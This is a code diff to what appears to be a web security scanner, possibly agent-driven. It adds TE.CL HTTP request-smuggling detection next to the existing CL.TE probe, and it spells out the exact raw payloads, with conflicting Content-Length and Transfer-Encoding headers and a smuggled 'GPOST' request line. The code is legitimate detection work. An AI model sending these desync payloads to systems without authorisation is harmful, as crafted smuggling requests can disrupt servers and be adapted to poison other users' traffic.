@@ -828,51 +828,92 @@ _SMUGGLE_G = re.compile(r"G(GET|POST|PUT|HEAD|DELETE|OPTIONS|PATCH)\b|"
                         r"['\"( ]G[A-Z]{2,}['\")] ?|method '?G", re.I)
 
 
-def probe_smuggle(ctx: Context, url: str) -> dict:
-    """HTTP request-smuggling detection - CL.TE variant.
-
-    Sends ONE ambiguous request (both Content-Length and Transfer-Encoding:
-    chunked) whose body ends with a stray 'G', then a clean request on the
-    SAME connection. If a front/back pair disagrees on framing, the 'G' is
-    left in the stream and poisons the SECOND request's method line -
-    observed as a 4xx/5xx naming a bogus 'G*' method. This only corrupts
-    our own follow-up request, never a stranger's queue (the standard
-    safe detection from the PortSwigger methodology)."""
+def _smuggle_pair(ctx: Context, url: str, ambiguous: dict,
+                  note: str) -> list[dict]:
     r = ctx.client.send_raw(
         url,
-        requests=[
-            {"method": "POST",
-             "headers": [["Content-Length", "6"],
-                         ["Transfer-Encoding", "chunked"]],
-             "body": b"0\r\n\r\nG"},
-            {"method": "GET", "headers": [], "body": b""},
-        ],
-        tool="probe_smuggle",
+        requests=[ambiguous, {"method": "GET", "headers": [], "body": b""}],
+        tool="probe_smuggle", note=note)
+    return r.get("sends") or []
+
+
+def probe_smuggle(ctx: Context, url: str) -> dict:
+    """HTTP request-smuggling detection - CL.TE and TE.CL variants.
+
+    Each variant sends ONE ambiguous request (both Content-Length and
+    Transfer-Encoding) on a connection, then a clean request behind it.
+    If a front/back pair disagrees on framing, leftover bytes poison the
+    SECOND request's method line - observed as a 4xx/5xx naming a bogus
+    'G*' method. The stray bytes can only corrupt our own follow-up
+    request, never a stranger's queue (the standard safe detection from
+    the PortSwigger methodology)."""
+    # CL.TE: front honors CL (6 bytes, all forwarded), back-end honors
+    # chunked -> 'G' is left in the stream
+    sends = _smuggle_pair(ctx, url, {
+        "method": "POST",
+        "headers": [["Content-Length", "6"],
+                    ["Transfer-Encoding", "chunked"]],
+        "body": b"0\r\n\r\nG"},
         note="CL.TE detect - 'G' may only poison our own next request")
-    sends = r.get("sends") or []
     if len(sends) < 2:
         return {"verdict": "inconclusive: connection did not survive the "
                            "ambiguous request", "sends": sends}
     s1, s2 = sends[0], sends[1]
     if s2.get("error"):
-        verdict = ("inconclusive: second request failed after the ambiguous "
-                   "one - could be a desync or just a dropped connection; "
-                   "retry manually")
-    elif s2["status"] >= 400 and _SMUGGLE_G.search(s2.get("body") or ""):
-        verdict = ("cl.te desync candidate: the stray 'G' poisoned the next "
-                   "request's method line - back-end parsed chunked framing "
-                   "while the front-end forwarded Content-Length bytes")
-    elif s2["status"] < 400 and s1["status"] < 400:
-        verdict = ("no cl.te signal: second request clean - back-end likely "
-                   "honored Content-Length (or no front/back parse split)")
+        return {"verdict": "inconclusive: second request failed after the "
+                           "ambiguous one - could be a desync or just a "
+                           "dropped connection; retry manually",
+                "ambiguous_id": s1["request_id"], "sends": sends}
+    if s2["status"] >= 400 and _SMUGGLE_G.search(s2.get("body") or ""):
+        return {"verdict": "cl.te desync candidate: the stray 'G' poisoned "
+                           "the next request's method line - back-end parsed "
+                           "chunked framing while the front-end forwarded "
+                           "Content-Length bytes",
+                "ambiguous_id": s1["request_id"],
+                "check_id": s2["request_id"],
+                "statuses": [s1["status"], s2["status"]]}
+    # TE.CL: front honors chunked (whole body forwarded), back-end honors
+    # CL (4 bytes) -> the smuggled 'GPOST /' prefix stays in the stream.
+    # It is a complete request line, so the poisoned response arrives
+    # WITHOUT a second send - reads=2 collects it.
+    r2 = ctx.client.send_raw(
+        url,
+        requests=[{"method": "POST", "reads": 2,
+                   "headers": [["Content-Length", "4"],
+                               ["Transfer-Encoding", "chunked"]],
+                   # '14' = 20-byte chunk holding the fake request line; a
+                   # CL reader consumes only '14\r\n' and leaves 'GPOST /'
+                   "body": b"14\r\nGPOST / HTTP/1.1\r\n\r\n\r\n0\r\n\r\n"}],
+        tool="probe_smuggle",
+        note="TE.CL detect - poisoned request answers on its own")
+    sends2 = r2.get("sends") or []
+    if len(sends2) < 2:
+        return {"verdict": "inconclusive: TE.CL probe got no queued "
+                           "response", "sends": sends + sends2}
+    t1, t2 = sends2[0], sends2[1]
+    if t2["status"] >= 400 and _SMUGGLE_G.search(t2.get("body") or ""):
+        return {"verdict": "te.cl desync candidate: the smuggled 'GPOST' "
+                           "request answered on its own - back-end honored "
+                           "Content-Length while the front-end forwarded "
+                           "chunked framing",
+                "ambiguous_id": t1["request_id"],
+                "check_id": t2["request_id"],
+                "statuses": [s1["status"], s2["status"],
+                             t1["status"], t2["status"]]}
+    # the poisoned request is self-contained, so desync => an extra
+    # response; nothing extra arriving means the framing agreed
+    nothing_queued = bool(t2.get("error")) or t2["status"] == 0
+    if (nothing_queued or t2["status"] < 400) and s2["status"] < 400:
+        verdict = ("no desync signal: clean follow-up on both variants - "
+                   "back-end and front-end likely agree on framing")
     else:
-        verdict = ("inconclusive: second request rejected but without a "
-                   "'G*' method signature - manual review needed")
+        verdict = ("inconclusive: follow-up rejected but without a 'G*' "
+                   "method signature - manual review needed")
     return {"verdict": verdict,
-            "ambiguous_id": s1["request_id"], "check_id": s2["request_id"],
-            "statuses": [s1["status"], s2["status"]],
-            "note": "TE.CL and HTTP/2-downgrade variants are separate - "
-                    "load_skill('request-smuggling') for those"}
+            "statuses": [s1["status"], s2["status"],
+                         t1["status"], t2["status"]],
+            "note": "HTTP/2-downgrade and client-side desync are separate "
+                    "classes - load_skill('request-smuggling')"}
 
 
 _DISCLOSE_PATHS: list[tuple[str, re.Pattern]] = [
